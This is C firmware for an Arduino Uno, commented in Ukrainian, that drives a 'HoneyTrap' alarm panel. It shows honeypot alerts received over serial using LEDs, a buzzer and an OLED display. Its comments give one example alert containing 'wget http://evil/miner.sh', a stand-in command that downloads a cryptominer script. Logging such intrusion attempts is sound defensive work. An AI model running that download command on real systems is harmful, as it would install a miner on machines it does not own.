/*
 * HoneyTrap: панель тривоги на Arduino Uno (ATmega328P), чистий C.
 *
 * Підключення (та сама схема, що й на макетці):
 *   D2 -> 220 Ом -> зелений LED   (PD2)
 *   D3 -> 220 Ом -> жовтий LED    (PD3)
 *   D4 -> 220 Ом -> червоний LED  (PD4)
 *   D5 -> активний бузер (+)      (PD5)
 *   D6 -> кнопка -> GND           (PD6, внутрішня підтяжка до 5V)
 *   A4 -> OLED SDA, A5 -> OLED SCL, OLED VCC -> 5V, OLED GND -> GND
 *
 * Що приходить з ноутбука по USB (9600 бод), один рядок на алерт:
 *   <рівень>;<ip>;<повідомлення>\n      рівень: L, M або H
 *   Приклад: H;10.0.0.5;wget http://evil/miner.sh
 *
 * Що робить панель:
 *   спокій  — зелений, на екрані ALL QUIET
 *   LOW     — зелений + жовтий
 *   MEDIUM  — жовтий, 1 писк
 *   HIGH    — червоний блимає, 3 писки
 *   Рівень тільки зростає. Кнопка повертає панель у спокій.
 */

#include <avr/interrupt.h>
#include <avr/io.h>
#include <stdlib.h>
#include <util/delay.h>

#include "oled.h"
#include "uart.h"

#define LED_GREEN  PD2
#define LED_YELLOW PD3
#define LED_RED    PD4
#define BUZZER     PD5
#define BUTTON     PD6

enum level { LVL_IDLE, LVL_LOW, LVL_MEDIUM, LVL_HIGH };

static enum level panel_level = LVL_IDLE;   /* що зараз показує панель */
static uint16_t alert_count = 0;            /* скільки алертів прийшло всього */

// Світлодіоди, бузер, кнопка 

// yалаштувати піни: LED і бузер — виходи, кнопка — вхід з підтяжкою. */
static void pins_init(void)
{
    DDRD |= (1 << LED_GREEN) | (1 << LED_YELLOW) | (1 << LED_RED) | (1 << BUZZER);
    DDRD &= (uint8_t)~(1 << BUTTON);
    PORTD |= (1 << BUTTON);     
}


static void pin_set(uint8_t pin, uint8_t on)
{
    if (on)
        PORTD |= (uint8_t)(1 << pin);
    else
        PORTD &= (uint8_t)~(1 << pin);
}

/* gоказати рівень світлодіодами. red_on - для блимання на HIGH. */
static void leds_show(enum level lvl, uint8_t red_on)
{
    pin_set(LED_GREEN,  lvl == LVL_IDLE || lvl == LVL_LOW);
    pin_set(LED_YELLOW, lvl == LVL_LOW || lvl == LVL_MEDIUM);
    pin_set(LED_RED,    lvl == LVL_HIGH && red_on);
}

/* пискнути count разів */
static void buzzer_beep(uint8_t count)
{
    for (uint8_t i = 0; i < count; i++) {
        pin_set(BUZZER, 1);
        _delay_ms(150);
        pin_set(BUZZER, 0);
        _delay_ms(100);
    }
}


static int button_pressed(void)
{
    if (PIND & (1 << BUTTON))
        return 0;                    
    _delay_ms(20);
    if (PIND & (1 << BUTTON))
        return 0;                    
    while (!(PIND & (1 << BUTTON)))
        ;                            
    _delay_ms(20);
    return 1;
}

static void self_test(void)
{
    pin_set(LED_GREEN, 1);
    pin_set(LED_YELLOW, 1);
    pin_set(LED_RED, 1);
    buzzer_beep(1);
    _delay_ms(400);
}

// розбір рядка з ноутбука 

/* Розібрати "H;10.0.0.5;wget ..." на рівень, IP і повідомлення.
 * line змінюється: замість ';' ставимо '\0'.
 * Повертає 1, якщо рядок правильний, і 0, якщо ні. */
static int parse_line(char *line, enum level *lvl, char **ip, char **msg)
{
    switch (line[0]) {
    case 'L': case 'l': *lvl = LVL_LOW;    break;
    case 'M': case 'm': *lvl = LVL_MEDIUM; break;
    case 'H': case 'h': *lvl = LVL_HIGH;   break;
    default: return 0;
    }
    if (line[1] != ';')
        return 0;

    *ip = &line[2];
    char *p = *ip;
    while (*p != '\0' && *p != ';')
        p++;
    if (*p == ';') {
        *p = '\0';
        *msg = p + 1;               
    } else {
        *msg = p;                   
    }
    return 1;
}

// Екран 

// лічильник алертів
static void show_count(void)
{
    char num[6];
    utoa(alert_count, num, 10);
    oled_clear_row(7);
    oled_print(7, 0, "alerts:");
    oled_print(7, 8, num);
}

//кран спокою
static void show_idle(void)
{
    oled_clear();
    oled_print(0, 0, "HoneyTrap panel");
    oled_print_big(2, 0, "ALL QUIET");
    oled_print(5, 0, "waiting for alerts");
    show_count();
}

/* Екран тривоги */
static void show_alert(enum level lvl, const char *ip, const char *msg)
{
    static const char *names[] = { "", "LOW", "MEDIUM", "HIGH" };

    oled_clear();
    oled_print_big(0, 0, names[lvl]);
    oled_print(3, 0, "IP:");
    oled_print(3, 4, ip);
    oled_print(4, 0, msg);                 
    uint8_t len = 0;
    while (msg[len] != '\0')
        len++;
    if (len > 21)
        oled_print(5, 0, msg + 21);        
    show_count();
}

static void handle_line(char *line)
{
    enum level lvl;
    char *ip;
    char *msg;

    if (!parse_line(line, &lvl, &ip, &msg))
        return;                       

    alert_count++;

    
    if (lvl < panel_level) {
        show_count();
        return;
    }

    panel_level = lvl;
    show_alert(lvl, ip, msg);
    leds_show(panel_level, 1);

    if (lvl == LVL_MEDIUM)
        buzzer_beep(1);
    else if (lvl == LVL_HIGH)
        buzzer_beep(3);
}

int main(void)
{
    char line[UART_LINE_LEN];
    uint8_t tick = 0;                 
    uint8_t red_on = 1;

    pins_init();
    self_test();
    uart_init();
    oled_init();                       /* якщо екрана немає, панель працює без нього */
    sei();                             

    show_idle();
    leds_show(panel_level, 1);

    for (;;) {
        if (uart_get_line(line, sizeof line))
            handle_line(line);

        if (button_pressed()) {
            panel_level = LVL_IDLE;
            show_idle();
            leds_show(panel_level, 1);
        }

        /* На HIGH червоний перемикається кожні 250 мс. */
        if (panel_level == LVL_HIGH && ++tick >= 25) {
            tick = 0;
            red_on = !red_on;
            leds_show(panel_level, red_on);
        }

        _delay_ms(10);
    }
}
